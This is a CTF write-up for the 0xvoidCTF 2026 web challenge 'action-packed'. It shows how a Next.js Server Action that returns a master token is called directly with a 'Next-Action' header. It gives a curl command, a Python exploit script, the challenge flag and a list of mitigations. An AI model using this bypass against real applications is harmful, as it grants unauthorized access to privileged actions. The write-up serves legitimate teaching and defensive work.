# 0xvoidCTF 2026 — Action Packed

| Metadata    | Value |
|-------------|-------|
| **Category** | Web |
| **Challenge** | action-packed |
| **Flag** | `0xV01D{89aa32dd-b76e-4638-ad74-808bde6a1249}` |
| **URL** | `http://nexus-nektar-exploitx-404e.challs.0xv01d-ctf.xyz:8001/` |

---

## Description

> An internal dashboard exposes convenience actions for trusted workflows. The interesting part is not the button, but the context around the request.

---

## Reconnaissance

Visiting the challenge URL reveals a Next.js application titled **"Pulse Dashboard (Internal)"** with an **"Admin Mode"** badge. The page presents two forms:

1. **Profile Settings** — Update name and department fields.
2. **API Access** — A single button labeled **"Generate Master Token"**, described as _"Restricted to active session origin."_

Both forms submit via `POST` with empty `action` attributes and include a hidden field prefixed with `$ACTION_ID_`, which is the telltale signature of **Next.js Server Actions**.

```html
<!-- Generate Master Token form -->
<form action="" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="$ACTION_ID_33924c174e655435ab82a6bdaee5448329835b12" />
  <button type="submit">Generate Master Token</button>
</form>
```

The hint _"the context around the request"_ points us away from the button itself and toward **how** the request is processed by the server.

---

## Vulnerability: Next.js Server Action Invocation

### Background

Next.js Server Actions (introduced in v13.4+) allow client-side forms and components to call server-side functions directly. When a server action is used, the framework embeds the **action ID** (a SHA-1 hash) in the page's serialized RSC (React Server Component) payload.

The client normally submits these actions as multipart form posts to the root URL. However, the Next.js server also accepts an alternative invocation format using the **`Next-Action` HTTP header** with a JSON body.

### The Flaw

The `Next-Action` header mechanism is intended for internal client-to-server communication, but **it does not enforce origin checks by default**. Any attacker who knows the action ID can directly invoke the server action from anywhere — completely bypassing the claim that it is _"Restricted to active session origin."_

This becomes even more dangerous when:
- The action ID is **embedded in the page source** (visible to any visitor).
- The action performs sensitive operations without additional auth checks.

---

## Exploitation

### Step 1: Extract the Action ID

From the page source, we identify the action ID for the "Generate Master Token" form:

```
33924c174e655435ab82a6bdaee5448329835b12
```

This comes from the serialized RSC payload in the `<script>` tags:

```javascript
5:{"id":"33924c174e655435ab82a6bdaee5448329835b12","bound":null}
```

### Step 2: Invoke the Action Directly

Send a `POST` request to the root URL with the `Next-Action` header and an empty JSON body:

```bash
curl -X POST "http://nexus-nektar-exploitx-404e.challs.0xv01d-ctf.xyz:8001/" \
  -H "Content-Type: application/json" \
  -H "Next-Action: 33924c174e655435ab82a6bdaee5448329835b12" \
  -d '{}'
```

### Step 3: Response

The server responds with a JSON-encoded token:

```
0:["$@1",["BXWGN_shhgAoAo8Z4rloN",null]]
1:{"token":"0xV01D{89aa32dd-b76e-4638-ad74-808bde6a1249}"}
```

The flag is embedded directly in the `token` field.

---

## Root Cause Analysis

| Issue | Details |
|-------|---------|
| **Exposed Action IDs** | The action ID hashes are leaked in the page's RSC payload, making them trivially discoverable. |
| **No origin enforcement** | The server action accepts requests via the `Next-Action` header without validating the `Origin` or `Referer` headers, despite claiming to be "restricted to active session origin." |
| **No additional authorization** | The "Generate Master Token" action does not require authentication beyond the action ID itself — no session tokens, CSRF tokens, or API keys are checked. |

---

## Exploit Script

```python
#!/usr/bin/env python3
import requests

URL = "http://nexus-nektar-exploitx-404e.challs.0xv01d-ctf.xyz:8001/"
ACTION_ID = "33924c174e655435ab82a6bdaee5448329835b12"

headers = {
    "Content-Type": "application/json",
    "Next-Action": ACTION_ID,
}

response = requests.post(URL, headers=headers, json={})

# Parse the RSC streaming response
lines = response.text.strip().split("\n")
for line in lines:
    if '"token"' in line:
        import json
        data = json.loads(line)
        print(f"Flag: {data['token']}")
        break
```

---

## Mitigation

1. **Validate the `Origin`/`Referer` header** on the server when processing server action requests to ensure they originate from the expected domain.
2. **Implement CSRF protection** for server actions that mutate state or expose sensitive data.
3. **Use session-based authorization** — verify the user's session/role before executing privileged actions, rather than relying on obscurity of the action ID.
4. **Avoid exposing sensitive server actions** on publicly accessible pages. If an action is truly internal-only, the endpoint should not be reachable from the public internet.
5. **Upgrade and monitor** — follow Next.js security advisories; some versions have introduced origin checks for server actions in newer releases.

